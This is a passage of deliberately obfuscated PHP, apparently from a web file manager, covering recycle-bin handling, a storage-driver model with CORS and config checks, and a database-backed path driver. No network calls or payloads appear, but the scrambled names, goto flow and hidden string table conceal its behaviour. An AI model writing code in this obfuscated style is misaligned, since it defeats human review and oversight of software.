return; } $C¢¿“‰÷®ì = array($e¸¶ë¨ßÍ“[394] => $eî¦«¼ôòø, $e¸¶ë¨ßÍ“[1418] => USER_ID, $e¸¶ë¨ßÍ“[534] => $E§†ëµµ[$e¸¶ë¨ßÍ“[382]], $e¸¶ë¨ßÍ“[535] => $E§†ëµµ[$e¸¶ë¨ßÍ“[469]], $e¸¶ë¨ßÍ“[538] => $E§†ëµµ[$e¸¶ë¨ßÍ“[472]]); $this->add($C¢¿“‰÷®ì); goto fœàÉçÂÏŞ; fœàÉçÂÏŞ: $this->recycleMove($eî¦«¼ôòø, 1); if ($E§†ëµµ[$e¸¶ë¨ßÍ“[381]] == $e¸¶ë¨ßÍ“[95]) { $eÇÙ·è—‘¯ = array($e¸¶ë¨ßÍ“[538] => array($e¸¶ë¨ßÍ“[496], $E§†ëµµ[$e¸¶ë¨ßÍ“[472]] . $eî¦«¼ôòø . $e¸¶ë¨ßÍ“[497])); $eİ•±Áå˜->where($eÇÙ·è—‘¯)->setField($e¸¶ë¨ßÍ“[408], 1); } goto F…˜¬•‰Í±; E„Ê¤‰àŠ : $e¸¶ë¨ßÍ“ =& $_SERVER[¹÷ˆ§éÒ°ú]; $eİ•±Áå˜ = Model($e¸¶ë¨ßÍ“[1108]); $E§†ëµµ = $eİ•±Áå˜->sourceInfo($eî¦«¼ôòø); goto bãç¢ˆ©¨Á; F…˜¬•‰Í±: } public function clear() { $this->remove(!1); } public function remove($F¡‘¤ê«„ = false) { goto b»‰¼•Ø‰›; cßØˆ¡®Å“: $F¡‘¤ê«„ = $F¡‘¤ê«„ === !1 ? !1 : $F¡‘¤ê«„; $d†«¥¦Ù˜å = array(); foreach ($d·®İ™òÚ as $C„¿äåã³×) { if ($F¡‘¤ê«„ != !1 && !in_array($C„¿äåã³×, $F¡‘¤ê«„)) { continue; } $eİÒ±¶õ†ï = $cÔœ„£ÕæÅ->sourceInfo($C„¿äåã³×); $cÔœ„£ÕæÅ->remove($C„¿äåã³×, !1); $dªèÙ£ó¥ = $eİÒ±¶õ†ï[$A…­¤õèÅ»[382]] . $A…­¤õèÅ»[82] . $eİÒ±¶õ†ï[$A…­¤õèÅ»[469]]; $d†«¥¦Ù˜å[$dªèÙ£ó¥] = array($A…­¤õèÅ»[534] => $eİÒ±¶õ†ï[$A…­¤õèÅ»[382]], $A…­¤õèÅ»[469] => $eİÒ±¶õ†ï[$A…­¤õèÅ»[469]]); $this->where(array($A…­¤õèÅ»[380] => $C„¿äåã³×))->delete(); } goto bÖÇçùÂŒ¯; b»‰¼•Ø‰›: $A…­¤õèÅ» =& $_SERVER[¹÷ˆ§éÒ°ú]; $cÔœ„£ÕæÅ = Model($A…­¤õèÅ»[1108]); $d·®İ™òÚ = $this->listData(); goto cßØˆ¡®Å“; bÖÇçùÂŒ¯: foreach ($d†«¥¦Ù˜å as $dã¡Öù±È) { $cÔœ„£ÕæÅ->targetSpaceUpdate($dã¡Öù±È[$A…­¤õèÅ»[382]], $dã¡Öù±È[$A…­¤õèÅ»[469]]); } goto Bˆ‰È¡–‡À; Bˆ‰È¡–‡À: } public function restore($C”™ÀÔÎ± = false) { goto F·¾ğÓé–­; F·¾ğÓé–­: $Fñ×éù¾º× =& $_SERVER[¹÷ˆ§éÒ°ú]; $d„­¾‚”×¼ = Model($Fñ×éù¾º×[1108]); $BšóÀó§†ƒ = $this->listData(); goto FëøÆŸ‹‚½; FÌ¹²ÊË‰„: foreach ($BšóÀó§†ƒ as $BƒĞñ¨¢ë) { goto bê“ÊöÉëÒ; Cî¬¾Ä­ãö: if ($c‡Çî¹‡ÆÎ[$Fñ×éù¾º×[408]] == $Fñ×éù¾º×[95]) { continue; } $d„­¾‚”×¼->lockMoveStart($BƒĞñ¨¢ë); $this->recycleMove($BƒĞñ¨¢ë, 0); goto CÒí”Â§¿ã; CÒí”Â§¿ã: if ($d³ºÂÛƒù[$Fñ×éù¾º×[381]] == $Fñ×éù¾º×[95]) { $Fèï±ÛÙÛÔ = array($Fñ×éù¾º×[538] => array($Fñ×éù¾º×[496], $d³ºÂÛƒù[$Fñ×éù¾º×[472]] . $BƒĞñ¨¢ë . $Fñ×éù¾º×[497])); $d„­¾‚”×¼->where($Fèï±ÛÙÛÔ)->setField($Fñ×éù¾º×[408], 0); $this->restoreFolderChildren($BƒĞñ¨¢ë, $BšóÀó§†ƒ); } $this->where(array($Fñ×éù¾º×[380] => $BƒĞñ¨¢ë))->delete(); $d„­¾‚”×¼->folderSizeReset($d³ºÂÛƒù[$Fñ×éù¾º×[474]]); goto D ß°Ã°; D ß°Ã°: $c·ƒâáçšœ[] = $d³ºÂÛƒù[$Fñ×éù¾º×[474]]; if ($d³ºÂÛƒù[$Fñ×éù¾º×[381]] == $Fñ×éù¾º×[95]) { $c·ƒâáçšœ[] = $BƒĞñ¨¢ë; } $d„­¾‚”×¼->lockMoveEnd($BƒĞñ¨¢ë); goto Eäì¬ë£ÏĞ; bê“ÊöÉëÒ: if ($C”™ÀÔÎ± != !1 && !in_array($BƒĞñ¨¢ë, $C”™ÀÔÎ±)) { continue; } $d³ºÂÛƒù = $d„­¾‚”×¼->sourceInfo($BƒĞñ¨¢ë); $c‡Çî¹‡ÆÎ = $d„­¾‚”×¼->sourceInfo($d³ºÂÛƒù[$Fñ×éù¾º×[474]]); goto Cî¬¾Ä­ãö; Eäì¬ë£ÏĞ: } $d„­¾‚”×¼->updateModifyTime($c·ƒâáçšœ); goto A›Õ¶Ôêá¦; FëøÆŸ‹‚½: $C”™ÀÔÎ± = $C”™ÀÔÎ± == !1 ? !1 : $C”™ÀÔÎ±; if (!$BšóÀó§†ƒ) { return !0; } $c·ƒâáçšœ = array(); goto FÌ¹²ÊË‰„; A›Õ¶Ôêá¦: } private function restoreFolderChildren($a¼øõ®å÷…, $D„°À®Ô) { goto B¸Å¶§¶Ÿ; B¸Å¶§¶Ÿ: $f°¯¼œåÓ£ =& $_SERVER[¹÷ˆ§éÒ°ú]; $F ‘ÄÉ¦» = Model($f°¯¼œåÓ£[1108]); $bëöÑÃ¡ = array($f°¯¼œåÓ£[380] => array($f°¯¼œåÓ£[17], array())); goto EÈçËÓÂå; EÈçËÓÂå: foreach ($D„°À®Ô as $e¥îãÚò‹) { if ($e¥îãÚò‹ == $a¼øõ®å÷…) { continue; } if (!$F ‘ÄÉ¦»->isParentOf($a¼øõ®å÷…, $e¥îãÚò‹)) { continue; } $e“áÜ¬â‘˜ = $F ‘ÄÉ¦»->sourceInfo($e¥îãÚò‹); if ($e“áÜ¬â‘˜[$f°¯¼œåÓ£[381]] == $f°¯¼œåÓ£[95]) { $bëöÑÃ¡[] = array($f°¯¼œåÓ£[538] => array($f°¯¼œåÓ£[496], $e“áÜ¬â‘˜[$f°¯¼œåÓ£[472]] . $e¥îãÚò‹ . $f°¯¼œåÓ£[497])); } else { $bëöÑÃ¡[$f°¯¼œåÓ£[380]][1][] = $e¥îãÚò‹; } } if (!$bëöÑÃ¡[$f°¯¼œåÓ£[380]][1]) { unset($bëöÑÃ¡[$f°¯¼œåÓ£[380]]); } if (!$bëöÑÃ¡) { return; } goto c÷¤Œª§ø¬; c÷¤Œª§ø¬: $bëöÑÃ¡[$f°¯¼œåÓ£[380]][1] = array_unique($bëöÑÃ¡[$f°¯¼œåÓ£[380]][1]); $bëöÑÃ¡[$f°¯¼œåÓ£[904]] = $f°¯¼œåÓ£[2183]; $F ‘ÄÉ¦»->where($bëöÑÃ¡)->setField($f°¯¼œåÓ£[408], 1); goto eµ‡ÏÓğô£; eµ‡ÏÓğô£: } private function recycleMove($fé ÖÄ…¤, $E‘«æéğ² = 1) { $dêëˆ°á’ =& $_SERVER[¹÷ˆ§éÒ°ú]; $fà¨¾‚çâ» = Model($dêëˆ°á’[1108]); $Eô‘»×åò› = Model($dêëˆ°á’[2373]); $c‡šÄ‰È = array($dêëˆ°á’[380] => $fé ÖÄ…¤); if ($E‘«æéğ²) { $fà¨¾‚çâ»->where($c‡šÄ‰È)->setField($dêëˆ°á’[408], 1); $Eô‘»×åò›->eventRecycle($fé ÖÄ…¤, $dêëˆ°á’[2374]); } else { $DÇÔ»Òğ¥£ = $fà¨¾‚çâ»->where($c‡šÄ‰È)->find(); $B ñ©¢ª‘™ = $DÇÔ»Òğ¥£[$dêëˆ°á’[381]] == $dêëˆ°á’[95]; $bôÀ¥ê…•¯ = $fà¨¾‚çâ»->fileNameAuto($DÇÔ»Òğ¥£[$dêëˆ°á’[474]], $DÇÔ»Òğ¥£[$dêëˆ°á’[38]], REPEAT_RENAME_FOLDER, $B ñ©¢ª‘™); if ($bôÀ¥ê…•¯ != $DÇÔ»Òğ¥£[$dêëˆ°á’[38]]) { $fà¨¾‚çâ»->rename($fé ÖÄ…¤, $bôÀ¥ê…•¯); } $fà¨¾‚çâ»->where($c‡šÄ‰È)->setField($dêëˆ°á’[408], 0); $Eô‘»×åò›->eventRecycle($fé ÖÄ…¤, $dêëˆ°á’[2375]); } } } class StorageModel extends ModelBaseLight { public $optionType = "\x53\x79\163\x74\x65\155\x2e\x73\x74\x6f\x72\141\x67\x65\114\151\x73\x74"; public $field = array("\x6e\x61\x6d\x65", "\163\x69\172\145\115\141\x78", "\163\x79\x73\164\x65\155", "\x64\x65\146\x61\165\x6c\x74", "\144\162\x69\x76\x65\162", "\x63\157\156\146\x69\147"); public function listData($AìÆœÌ³›¬ = false, $FÎ·í®ÃÈã = "\155\157\x64\x69\x66\171\x54\151\155\x65", $Cğí‚ Êë’ = false) { goto fùÖÄÑ†Èà; A®“ŠÌ†±: return $e„“Ë¡–Â; goto BÎ©îµè´„; fùÖÄÑ†Èà: $dó‡Ğ…«á× =& $_SERVER[¹÷ˆ§éÒ°ú]; $e„“Ë¡–Â = parent::listData($AìÆœÌ³›¬, $FÎ·í®ÃÈã, $Cğí‚ Êë’); if ($AìÆœÌ³›¬) { return $e„“Ë¡–Â; } goto F°ğ¡±Ş„®; F°ğ¡±Ş„®: foreach ($e„“Ë¡–Â as $AÍ¿óĞÏµ => $F™ñ•¢Ê©¤) { unset($e„“Ë¡–Â[$AÍ¿óĞÏµ][$dó‡Ğ…«á×[16]]); $e„“Ë¡–Â[$AÍ¿óĞÏµ][$dó‡Ğ…«á×[2084]] = 0; } $cÄÁƒĞØ´ = array_to_keyvalue($e„“Ë¡–Â, $dó‡Ğ…«á×[43], $dó‡Ğ…«á×[378]); $this->_listAppendSize($e„“Ë¡–Â, $cÄÁƒĞØ´); goto A®“ŠÌ†±; BÎ©îµè´„: } public function _listAppendSize(&$b®©Á‚¹ë, $C§öÊ“É»ë) { $dÉİŞ˜¢´½ =& $_SERVER[¹÷ˆ§éÒ°ú]; if (!$C§öÊ“É»ë) { return; } $eéÕ…îİƒù = $dÉİŞ˜¢´½[2376] . implode($dÉİŞ˜¢´½[57], $C§öÊ“É»ë) . $dÉİŞ˜¢´½[2377]; $eŠĞ›”‘ªç = Model($dÉİŞ˜¢´½[713])->query($eéÕ…îİƒù); $eŠĞ›”‘ªç = array_to_keyvalue($eŠĞ›”‘ªç, $dÉİŞ˜¢´½[378], $dÉİŞ˜¢´½[89]); foreach ($b®©Á‚¹ë as $CñéÁ¾÷£â => $AåÖ£–…½ğ) { $b®©Á‚¹ë[$CñéÁ¾÷£â][$dÉİŞ˜¢´½[2084]] = isset($eŠĞ›”‘ªç[$AåÖ£–…½ğ[$dÉİŞ˜¢´½[378]]]) ? $eŠĞ›”‘ªç[$AåÖ£–…½ğ[$dÉİŞ˜¢´½[378]]] : 0; } } public function getConfig($d„Î¹Ûéï´) { $C †íÌŸ˜ = parent::listData($d„Î¹Ûéï´); return json_decode($C †íÌŸ˜[$_SERVER[¹÷ˆ§éÒ°ú][16]], !0); } public function update($bàêë¼ÑÛæ, $D˜¨Œê‡ã¶) { goto f÷´º“àâé; a£ÇŒ÷İ•: $BÕ™Şâ’¡ = parent::update($bàêë¼ÑÛæ, $D˜¨Œê‡ã¶); if ($BÕ™Şâ’¡ && $D˜¨Œê‡ã¶[$F¶¦ªŠƒ÷[44]]) { foreach ($E¸à¯‚Êğ‹ as $DÑà—Ÿ×¡¯) { if ($DÑà—Ÿ×¡¯[$F¶¦ªŠƒ÷[44]] && $DÑà—Ÿ×¡¯[$F¶¦ªŠƒ÷[378]] != $bàêë¼ÑÛæ) { parent::update($DÑà—Ÿ×¡¯[$F¶¦ªŠƒ÷[378]], array($F¶¦ªŠƒ÷[44] => 0)); } } } return $BÕ™Şâ’¡; goto C‹§ÛÒÎµŠ; AÓµ·ôÙŞä: if (isset($E¸à¯‚Êğ‹[$B˜ë†Ù‚ë]) && $E¸à¯‚Êğ‹[$B˜ë†Ù‚ë][$F¶¦ªŠƒ÷[378]] != $bàêë¼ÑÛæ) { return !1; } if (isset($D˜¨Œê‡ã¶[$F¶¦ªŠƒ÷[2378]]) && $D˜¨Œê‡ã¶[$F¶¦ªŠƒ÷[2378]] == $F¶¦ªŠƒ÷[95]) { $this->checkConfig($D˜¨Œê‡ã¶); } unset($D˜¨Œê‡ã¶[$F¶¦ªŠƒ÷[2378]]); goto a£ÇŒ÷İ•; f÷´º“àâé: $F¶¦ªŠƒ÷ =& $_SERVER[¹÷ˆ§éÒ°ú]; $B˜ë†Ù‚ë = $D˜¨Œê‡ã¶[$F¶¦ªŠƒ÷[38]]; $E¸à¯‚Êğ‹ = array_to_keyvalue(parent::listData(), $F¶¦ªŠƒ÷[38]); goto AÓµ·ôÙŞä; C‹§ÛÒÎµŠ: } public function add($Eôù‚âŞğ) { goto c¿¼¼†Ôß; c’êø¥½: return $b’ºß¶Áˆ; goto fº÷éÒ¼‡Ğ; DÌ¤†ÈåèÑ: $this->checkConfig($Eôù‚âŞğ); $b’ºß¶Áˆ = parent::insert($Eôù‚âŞğ); if ($b’ºß¶Áˆ && $Eôù‚âŞğ[$aòÑÑ‘£ƒ[44]]) { foreach ($bÂ±©®šëã as $a à‡ãÒ¥Ü) { if ($a à‡ãÒ¥Ü[$aòÑÑ‘£ƒ[44]]) { parent::update($a à‡ãÒ¥Ü[$aòÑÑ‘£ƒ[378]], array($aòÑÑ‘£ƒ[44] => 0)); } } } goto c’êø¥½; c¿¼¼†Ôß: $aòÑÑ‘£ƒ =& $_SERVER[¹÷ˆ§éÒ°ú]; $bÂ±©®šëã = array_to_keyvalue(parent::listData(), $aòÑÑ‘£ƒ[38]); if (isset($bÂ±©®šëã[$Eôù‚âŞğ[$aòÑÑ‘£ƒ[38]]])) { return !1; } goto DÌ¤†ÈåèÑ; fº÷éÒ¼‡Ğ: } public function checkConfig(&$bòÛâ¿†§½) { goto Dùë²çÓæÅ; C”¼ƒÅšä: $d“÷§Æ‘Íá = $fæéÛõÖ“Î[83] . $Dâ‰¿•›ø; $Aöšè… = new $d“÷§Æ‘Íá($A«´®Û‹ñŠ); if (in_array($Aƒ¢‡ø¶Ÿ…, $Aöšè…->objectDriver)) { if (!$Aöšè…->isBucketCors() && !$Aöšè…->setBucketCors()) { $FŒ’è¢áêì = LNG($fæéÛõÖ“Î[2380]); $FŒ’è¢áêì .= $fæéÛõÖ“Î[2381] . LNG($fæéÛõÖ“Î[2382]); show_json($FŒ’è¢áêì, !1); } } goto b†ã¿¾´; C‹™ˆº‘¾´: foreach ($A«´®Û‹ñŠ as $Aßƒé¨½õÙ => $Eöâ—ÔİáÉ) { $A«´®Û‹ñŠ[$Aßƒé¨½õÙ] = trim($Eöâ—ÔİáÉ); } $A«´®Û‹ñŠ[$fæéÛõÖ“Î[2379]] = rand_string(6); $Dâ‰¿•›ø = $this->driverType($Aƒ¢‡ø¶Ÿ…); goto C”¼ƒÅšä; Dùë²çÓæÅ: $fæéÛõÖ“Î =& $_SERVER[¹÷ˆ§éÒ°ú]; $Aƒ¢‡ø¶Ÿ… = strtolower($bòÛâ¿†§½[$fæéÛõÖ“Î[102]]); $A«´®Û‹ñŠ = json_decode($bòÛâ¿†§½[$fæéÛõÖ“Î[16]], !0); goto C‹™ˆº‘¾´; D–Ó»Ÿœàâ: $A«´®Û‹ñŠ[$fæéÛõÖ“Î[1015]] = $F†ê·Ùé‡÷; $bòÛâ¿†§½[$fæéÛõÖ“Î[16]] = json_encode($A«´®Û‹ñŠ); $bòÛâ¿†§½[$fæéÛõÖ“Î[102]] = $Dâ‰¿•›ø; goto Dº‡‹¿µƒÓ; b†ã¿¾´: $F†ê·Ùé‡÷ = rtrim($A«´®Û‹ñŠ[$fæéÛõÖ“Î[1015]], $fæéÛõÖ“Î[18]) . $fæéÛõÖ“Î[18]; $DµÁÌµ‘ƒõ = $Aöšè…->getPath($F†ê·Ùé‡÷ . $fæéÛõÖ“Î[1979]); if (!$Aöšè…->mkfile($DµÁÌµ‘ƒõ)) { show_json(LNG($fæéÛõÖ“Î[2380]), !1); } goto D–Ó»Ÿœàâ; Dº‡‹¿µƒÓ: return !0; goto FŒÁ—ê’¶ˆ; FŒÁ—ê’¶ˆ: } private function driverType($b£”³¥““¤) { $F³¼œ¤ˆÛí =& $_SERVER[¹÷ˆ§éÒ°ú]; $aÎŒá³Œê = array($F³¼œ¤ˆÛí[114] => $F³¼œ¤ˆÛí[2383], $F³¼œ¤ˆÛí[70] => $F³¼œ¤ˆÛí[2384], $F³¼œ¤ˆÛí[76] => $F³¼œ¤ˆÛí[2385]); if (isset($aÎŒá³Œê[$b£”³¥““¤])) { return $aÎŒá³Œê[$b£”³¥““¤]; } return strtoupper($b£”³¥““¤); } public function driverListSystem() { $bÕòêñ•â” =& $_SERVER[¹÷ˆ§éÒ°ú]; $eÀÑì›ÃŞ = parent::listData(); $e¾Æ±‡¿ê = array(); foreach ($eÀÑì›ÃŞ as $f©ğ•ØÙ©) { unset($f©ğ•ØÙ©[$bÕòêñ•â”[199]], $f©ğ•ØÙ©[$bÕòêñ•â”[119]]); $f©ğ•ØÙ©[$bÕòêñ•â”[16]] = json_decode($f©ğ•ØÙ©[$bÕòêñ•â”[16]], !0); $e¾Æ±‡¿ê[] = $f©ğ•ØÙ©; } return $e¾Æ±‡¿ê; } public function defaultDriver() { $AÁÛŠ‰ÊÚ¶ =& $_SERVER[¹÷ˆ§éÒ°ú]; $E¢­é‡³Óø = parent::listData(); $açÁÂ¶ê‡Â = array_filter_by_field($E¢­é‡³Óø, $AÁÛŠ‰ÊÚ¶[44], 1); $açÁÂ¶ê‡Â = $açÁÂ¶ê‡Â[0]; if ($açÁÂ¶ê‡Â) { $açÁÂ¶ê‡Â[$AÁÛŠ‰ÊÚ¶[16]] = json_decode($açÁÂ¶ê‡Â[$AÁÛŠ‰ÊÚ¶[16]], !0); } return $açÁÂ¶ê‡Â; } public function driverInfo($C‰É«ù±Á¸) { $E˜³ğš§™Š =& $_SERVER[¹÷ˆ§éÒ°ú]; $b£Ò¸ïô˜» = array_to_keyvalue(parent::listData(), $E˜³ğš§™Š[378]); if (!isset($b£Ò¸ïô˜»[$C‰É«ù±Á¸])) { return !1; } $Eä¬÷ŠËÆó = $b£Ò¸ïô˜»[$C‰É«ù±Á¸]; $Eä¬÷ŠËÆó[$E˜³ğš§™Š[16]] = json_decode($Eä¬÷ŠËÆó[$E˜³ğš§™Š[16]], !0); return $Eä¬÷ŠËÆó; } public function remove($E±‰§Ş„ß) { $this->removeShareItems($E±‰§Ş„ß); return parent::remove($E±‰§Ş„ß); } public function removeWithFile($FÛÉ¾¹Ü‰ª) { goto eÌñÔ¡Ê©ô; E ³—”Êç: $bùÊ¯ÏŠ–î = Model($cÉßÀè´Âï[179])->where($f¾¸ˆìŞè¼)->field($cÉßÀè´Âï[2389])->select(); foreach ($bùÊ¯ÏŠ–î as $DÏÇ¤•Ïß) { goto D‰¥ŠîÀ´‚; F–ÎÓ†µï¸: $A‚Š²¥Åîù = array($cÉßÀè´Âï[738] => $d¦ÉŒçß›±, $cÉßÀè´Âï[87] => $c½¥…ÆÎáØ); Model($cÉßÀè´Âï[179])->where($f¾¸ˆìŞè¼)->save($A‚Š²¥Åîù); goto CÎöÊîš•’; FÖ·ñ£Şƒ£: if (IO::exist($c½¥…ÆÎáØ)) { $aõÅ«æ„¢->updateFileEnd($DÏÇ¤•Ïß[$cÉßÀè´Âï[38]], $DÏÇ¤•Ïß[$cÉßÀè´Âï[89]]); continue; } if (!IO::move($a¥½¢—É’É, get_path_father($c½¥…ÆÎáØ))) { $Eéö¹‚²ó = !1; break; } $f¾¸ˆìŞè¼ = array($cÉßÀè´Âï[430] => $DÏÇ¤•Ïß[$cÉßÀè´Âï[430]]); goto F–ÎÓ†µï¸; D‰¥ŠîÀ´‚: $a¥½¢—É’É = $DÏÇ¤•Ïß[$cÉßÀè´Âï[87]]; $c½¥…ÆÎáØ = $aÒ…¯µîÒ‚ . str_replace("\x7b\151\157\72{$FÛÉ¾¹Ü‰ª}\x7d\x2f", $cÉßÀè´Âï[43], $a¥½¢—É’É); if (!IO::exist($a¥½¢—É’É)) { $Aó£ˆ…ß‹å[] = $DÏÇ¤•Ïß[$cÉßÀè´Âï[430]]; $aõÅ«æ„¢->updateFileEnd($DÏÇ¤•Ïß[$cÉßÀè´Âï[38]], $DÏÇ¤•Ïß[$cÉßÀè´Âï[89]]); continue; } goto FÖ·ñ£Şƒ£; CÎöÊîš•’: } $this->removeByFileID($Aó£ˆ…ß‹å); goto aÁÄ÷öàš; aÁÄ÷öàš: if (!$Eéö¹‚²ó) { $aõÅ«æ„¢->stop($C‡ ğÆ¯œ„); return !1; } $aõÅ«æ„¢->end(); $this->remove($FÛÉ¾¹Ü‰ª); goto b“¼ÀïÕˆ; cí©Ù Ñ­Ù: $aÒ…¯µîÒ‚ = "\x7b\151\157\72{$d¦ÉŒçß›±}\x7d\x2f"; $Eéö¹‚²ó = !0; $Aó£ˆ…ß‹å = array(); goto E ³—”Êç; eÌñÔ¡Ê©ô: $cÉßÀè´Âï =& $_SERVER[¹÷ˆ§éÒ°ú]; $f¾¸ˆìŞè¼ = array($cÉßÀè´Âï[738] => $FÛÉ¾¹Ü‰ª); $AÃ ›öÂÎÉ = Model($cÉßÀè´Âï[433])->where($f¾¸ˆìŞè¼)->count(); goto b…Ñİ†Ùõˆ; b…Ñİ†Ùõˆ: $bÚ£¶‹ğİ = Model($cÉßÀè´Âï[433])->where($f¾¸ˆìŞè¼)->sum($cÉßÀè´Âï[89]); $C‡ ğÆ¯œ„ = $cÉßÀè´Âï[2386] . $FÛÉ¾¹Ü‰ª; $aõÅ«æ„¢ = new TaskFileTransfer($C‡ ğÆ¯œ„, $cÉßÀè´Âï[2387], $AÃ ›öÂÎÉ, LNG($cÉßÀè´Âï[2388]) . "\x28{$FÛÉ¾¹Ü‰ª}\51"); goto EÀÒàÅ¿¾›; EÀÒàÅ¿¾›: $aõÅ«æ„¢->task[$cÉßÀè´Âï[693]] = (double) $bÚ£¶‹ğİ; $bƒÓ¼¬àÍ¤ = KodIO::defaultDriver(); $d¦ÉŒçß›± = $bƒÓ¼¬àÍ¤[$cÉßÀè´Âï[378]]; goto cí©Ù Ñ­Ù; b“¼ÀïÕˆ: } public function progress($eÃÍò‡¥‹) { return Task::get($_SERVER[¹÷ˆ§éÒ°ú][2386] . $eÃÍò‡¥‹); } private function removeByFileID($d†‹»¬–ãİ = array()) { goto a‹¦§ˆØŒ; c†¦¶½éßÂ: $fœÏáÓ¾†± = Model($a÷õ˜•ë[1108])->where($B‚¤ßêÔÁÉ)->field($a÷õ˜•ë[380])->select(); if (!$fœÏáÓ¾†±) { return; } $fœÏáÓ¾†± = array_to_keyvalue($fœÏáÓ¾†±, $a÷õ˜•ë[43], $a÷õ˜•ë[380]); goto B”ªàƒŞË¢; B”ªàƒŞË¢: foreach ($fœÏáÓ¾†± as $cÛìİÊÁ¿¾) { Model($a÷õ˜•ë[393])->removeNow($cÛìİÊÁ¿¾, !1); } goto cÛš´ÄœÖã; a‹¦§ˆØŒ: $a÷õ˜•ë =& $_SERVER[¹÷ˆ§éÒ°ú]; if (empty($d†‹»¬–ãİ)) { return; } $B‚¤ßêÔÁÉ = array($a÷õ˜•ë[430] => array($a÷õ˜•ë[17], $d†‹»¬–ãİ)); goto c†¦¶½éßÂ; cÛš´ÄœÖã: } private function removeShareItems($cè«õ‹Ş‰Ö) { goto E‘ÛšÜÑĞÍ; E›êà¸ÔÆ˜: $D¼ÊŒ» = Model($Bö„ÚìŒÈš[2075])->where($e»ÏÁæ±ç½)->field($Bö„ÚìŒÈš[452])->select(); if (empty($D¼ÊŒ»)) { return; } $C‹ÃİĞœŠ = array_to_keyvalue($D¼ÊŒ», $Bö„ÚìŒÈš[43], $Bö„ÚìŒÈš[452]); goto b©Š¶°†¬; E‘ÛšÜÑĞÍ: $Bö„ÚìŒÈš =& $_SERVER[¹÷ˆ§éÒ°ú]; $B½ù¬…à»Ê = "\173\151\157\x3a{$cè«õ‹Ş‰Ö}\175\x2f"; $e»ÏÁæ±ç½ = array($Bö„ÚìŒÈš[380] => 0, $Bö„ÚìŒÈš[1010] => array($Bö„ÚìŒÈš[746], "{$B½ù¬…à»Ê}\x25")); goto E›êà¸ÔÆ˜; b©Š¶°†¬: Model($Bö„ÚìŒÈš[549])->remove($C‹ÃİĞœŠ); goto Dù šƒ½÷¬; Dù šƒ½÷¬: } } goto eÕ¤°Çğ·; CéãÈ¨æ¥ï: class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($C‘ÍÄ“ˆŞ¢) { $this->pathParse = $C‘ÍÄ“ˆŞ¢; $this->model = Model($_SERVER[¹÷ˆ§éÒ°ú][1108]); } public function getPath($C‰Ü»‡å’²) { return trim($C‰Ü»‡å’², $_SERVER[¹÷ˆ§éÒ°ú][18]); } public function pathFather($b²ÒŒÚƒ‡×) { $AŠÎÒ¢Úº© = $this->parse($b²ÒŒÚƒ‡×); $AŠÎÒ¢Úº© = $this->infoSimple($b²ÒŒÚƒ‡×); return $AŠÎÒ¢Úº© ? $AŠÎÒ¢Úº©[$_SERVER[¹÷ˆ§éÒ°ú][474]] : !1; } public function getPathName($AÉ›¯Ôåˆ) { $fÈôŠ‹è’¶ = $this->infoSimple($AÉ›¯Ôåˆ); return $fÈôŠ‹è’¶ ? $fÈôŠ‹è’¶[$_SERVER[¹÷ˆ§éÒ°ú][38]] : !1; } public function getPathOuter($FŸóœÈÊ½) { if (!$FŸóœÈÊ½) { return $FŸóœÈÊ½; } $C¢ºÔ˜ñ = $this->parse($FŸóœÈÊ½); return KodIO::make($C¢ºÔ˜ñ[$_SERVER[¹÷ˆ§éÒ°ú][378]]); } public function copyFolderFromIO($c×¶ÀÒğí“, $AŸÛÕŠ÷, $dÊù‹ùâ¾ï, $eåÜ°¥½‚Ç, $eçŠ²Ï•‚) { $C³¢†ã„•À = $this->model->copyFolderFromIO($c×¶ÀÒğí“, $AŸÛÕŠ÷, $dÊù‹ùâ¾ï, $eåÜ°¥½‚Ç, $eçŠ²Ï•‚); return KodIO::make($C³¢†ã„•À); } public function isParentOf($E³ô¬¾åæÂ, $BÂ×°ãÅö) { return $this->model->isParentOf($E³ô¬¾åæÂ, $BÂ×°ãÅö); } public function mkfile($b’Şø—Š‡³, $Dô„ÛÏ½© = '', $c¯®ğò¥” = REPEAT_RENAME) { $cÒõ¢ïÎ…à =& $_SERVER[¹÷ˆ§éÒ°ú]; $F±è’ÄÂˆ¯ = $this->parse($b’Şø—Š‡³); $b’Şø—Š‡³ = $F±è’ÄÂˆ¯[$cÒõ¢ïÎ…à[378]]; for ($D®…êŸ‰î = 0; $D®…êŸ‰î < count($F±è’ÄÂˆ¯[$cÒõ¢ïÎ…à[1109]]); $D®…êŸ‰î++) { $f‘„Ô©„† = $F±è’ÄÂˆ¯[$cÒõ¢ïÎ…à[1109]][$D®…êŸ‰î]; if ($D®…êŸ‰î == count($F±è’ÄÂˆ¯[$cÒõ¢ïÎ…à[1109]]) - 1) { $b’Şø—Š‡³ = $this->model->mkfile($b’Şø—Š‡³, $f‘„Ô©„†, $Dô„ÛÏ½©, $c¯®ğò¥”); break; } $b’Şø—Š‡³ = $this->model->mkdir($b’Şø—Š‡³, $f‘„Ô©„†, REPEAT_SKIP); } return $this->getPathOuter($b’Şø—Š‡³); } public function mkdir($a¤„…Á®½, $f†©¼ÂÚœ = REPEAT_SKIP) { $c¿‰†Å–˜Ö =& $_SERVER[¹÷ˆ§éÒ°ú]; $EÚîƒñùŒñ = $this->parse($a¤„…Á®½); $a¤„…Á®½ = $EÚîƒñùŒñ[$c¿‰†Å–˜Ö[378]]; for ($eÏ½Ô›ŞË = 0; $eÏ½Ô›ŞË < count($EÚîƒñùŒñ[$c¿‰†Å–˜Ö[1109]]); $eÏ½Ô›ŞË++) { $C„‡Æ‚÷ƒ = $EÚîƒñùŒñ[$c¿‰†Å–˜Ö[1109]][$eÏ½Ô›ŞË]; $a¤„…Á®½ = $this->model->mkdir($a¤„…Á®½, $C„‡Æ‚÷ƒ, $f†©¼ÂÚœ); } return $this->getPathOuter($a¤„…Á®½); } public function copyFile($a‚“—ºìÜÌ, $D¡ô”Ü¹à, $eÜíÓĞ¾Ã = REPEAT_REPLACE) { $Bªå©’ùÌ™ =& $_SERVER[¹÷ˆ§éÒ°ú]; $dÔˆª®„ñ = $this->parse($D¡ô”Ü¹à); $dÕáŠÎæÀ“ = $this->model->copy($a‚“—ºìÜÌ, $dÔˆª®„ñ[$Bªå©’ùÌ™[378]], $eÜíÓĞ¾Ã, $dÔˆª®„ñ[$Bªå©’ùÌ™[87]]); return $dÕáŠÎæÀ“ ? $this->getPathOuter($dÕáŠÎæÀ“) : !1; } public function moveFile($D›ë¯à…², $C¢ÂÎåó , $a¹™¿¤æ¯ = REPEAT_REPLACE) { $F—ßÜëè« =& $_SERVER[¹÷ˆ§éÒ°ú]; $FñË«çİÖ = 